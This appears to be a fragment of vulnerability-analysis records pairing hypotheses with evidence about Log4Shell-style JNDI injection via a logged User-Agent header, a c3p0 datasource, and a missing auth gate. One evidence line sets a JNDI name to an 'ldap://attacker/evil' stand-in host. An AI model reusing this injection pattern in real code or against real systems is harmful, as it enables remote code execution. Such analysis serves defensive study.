hypotheses.statement: Svc logs an untrusted header via log4j JndiLookup (taint reaches the JNDI sink).

evidence.text: log.info("request from {}", ua) where ua is the untrusted User-Agent header.

hypotheses.statement: c3p0 datasource is configured from a remote JNDI name (JndiRefForwardingDataSource).

evidence.text: ds.setJndiName("ldap://attacker/evil") — remote JNDI name from attacker control.

hypotheses.statement: No auth gate protects the endpoint.
